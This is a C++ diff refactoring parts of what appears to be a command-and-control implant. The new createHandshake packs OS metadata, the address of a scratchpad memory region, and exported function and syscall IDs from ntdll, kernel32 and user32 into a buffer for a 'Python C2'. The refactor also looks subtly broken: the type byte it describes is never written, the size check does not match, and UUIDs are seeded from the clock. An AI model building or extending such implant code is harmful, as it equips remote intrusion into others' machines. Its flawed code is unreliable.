@@ -1,96 +1,68 @@
 #include "global.hpp"
-vector<pair<string, QWORD>> getDllSyscallsOrExports(vector<pair<string, void*>> exports);
-vector<pair<string, void*>> getDllExports(wstring dllName);
-string pairsToString(const vector<pair<string, QWORD>>& values);
-PVOID getMem();
+#include <ctime>
+size_t enumerateExportsAndSyscalls(const char* dllName, char* outBuffer, size_t outCapacity);
 
-wstring random_uuid() {
-    random_device rd;
-    mt19937 gen(rd());
-    uniform_int_distribution<int> dist(0, 255);
+
+void random_uuid(wchar_t* out) {
+    srand(time(NULL));
 
     unsigned char bytes[16];
+
     for (int i = 0; i < 16; i++) {
-        bytes[i] = static_cast<unsigned char>(dist(gen));
+        bytes[i] = (unsigned char)(rand() % 256);
     }
 
+    // Set version (4) and variant (RFC 4122)
     bytes[6] = (bytes[6] & 0x0F) | 0x40;
     bytes[8] = (bytes[8] & 0x3F) | 0x80;
 
-    wstringstream ss;
-    ss << hex << setfill(L'0');
+    const wchar_t hex[] = L"0123456789abcdef";
+
+    size_t pos = 0;
 
     for (int i = 0; i < 16; i++) {
-        ss << setw(2) << static_cast<int>(bytes[i]);
+        out[pos++] = hex[(bytes[i] >> 4) & 0xF];
+        out[pos++] = hex[bytes[i] & 0xF];
+
         if (i == 3 || i == 5 || i == 7 || i == 9) {
-            ss << L"-";
+            out[pos++] = L'-';
         }
     }
 
-    return ss.str();
+    out[pos] = L'\0'; // null terminate
 }
 
-string random_uuid_s() {
-    random_device rd;
-    mt19937 gen(rd());
-    uniform_int_distribution<int> dist(0, 255);
+// Refactored createHandshake using raw memory buffers
+size_t createHandshake(char* resp, size_t respMax, void* scratchpad) {
+    if (respMax < 17) return 0; // Minimum size for [Type][OS][Scratchpad]
 
-    unsigned char bytes[16];
-    for (int i = 0; i < 16; i++) {
-        bytes[i] = static_cast<unsigned char>(dist(gen));
-    }
+    size_t offset = 0;
 
-    bytes[6] = (bytes[6] & 0x0F) | 0x40;
-    bytes[8] = (bytes[8] & 0x3F) | 0x80;
 
-    stringstream ss;
-    ss << hex << setfill('0');
+    // 2. OS Metadata (8 bytes)
+    // For authorized assessments, use GetVersionEx or hardcode a target placeholder
+    unsigned long long os = 0; 
+    memcpy(resp + offset, &os, 8);
+    offset += 8;
 
-    for (int i = 0; i < 16; i++) {
-        ss << setw(2) << static_cast<int>(bytes[i]);
-        if (i == 3 || i == 5 || i == 7 || i == 9) {
-            ss << "-";
-        }
-    }
+    // 3. Scratchpad Address (8 bytes)
+    // This informs the C2 where our syscall/string memory is located
+    unsigned long long p_scratchpad = (unsigned long long)scratchpad;
+    memcpy(resp + offset, &p_scratchpad, 8);
+    offset += 8;
 
-    return ss.str();
-}
+    // 4. Enumerate Essential DLLs Directly into the Response Buffer
+    // We append ntdll, kernel32, and user32 exports sequentially
+    // The Python C2 will parse this as a continuous stream of [B][Name][Q]
+    
+    // ntdll.dll (Source for syscall IDs)
+    offset += enumerateExportsAndSyscalls("ntdll.dll", resp + offset, respMax - offset);
+    
+    // kernel32.dll (Source for CreateProcess, LoadLibrary, etc.)
+    offset += enumerateExportsAndSyscalls("kernel32.dll", resp + offset, respMax - offset);
 
-string getOperatingSystem() {
-    return string(8, 0);
-#ifdef _WIN32
-    return "Windows";
-#elif __APPLE__
-    return "macOS";
-#elif __linux__
-    return "Linux";
-#elif __unix__
-    return "Unix";
-#else
-    return "Unknown";
-#endif
-}
+    // user32.dll (Source for MessageBox, etc.)
+    offset += enumerateExportsAndSyscalls("user32.dll", resp + offset, respMax - offset);
 
-string create_handshake(){
-    vector<pair<string, void*>> ntdll = getDllExports(L"ntdll.dll");
-    vector<pair<string, void*>> kernel32 = getDllExports(L"kernel32.dll");
-    vector<pair<string, void*>> user32 = getDllExports(L"user32.dll");
-    vector<pair<string, QWORD>> ntDLLSyscalls = getDllSyscallsOrExports(ntdll);
-    vector<pair<string, QWORD>> kernel32Syscalls = getDllSyscallsOrExports(kernel32);
-    vector<pair<string, QWORD>> user32Syscalls = getDllSyscallsOrExports(user32);
-    string ntdll_syscall_list = pairsToString(ntDLLSyscalls);
-    string kernel32_syscall_list = pairsToString(kernel32Syscalls);
-    string user32_syscall_list = pairsToString(user32Syscalls);
-    PVOID scratchpad = getMem();
-    QWORD os = 0;
-    string handshake;
-    handshake.append(1,(char)0);
-    handshake.append((char*)(&os), 8);
-    handshake.append((char*)(&scratchpad), 8);
-    handshake += ntdll_syscall_list;
-    handshake += ", ";
-    handshake += kernel32_syscall_list;
-    handshake += ", ";
-    handshake += user32_syscall_list;   
-    return handshake;
+    return offset; // Return the total payload size to the network loop
 }
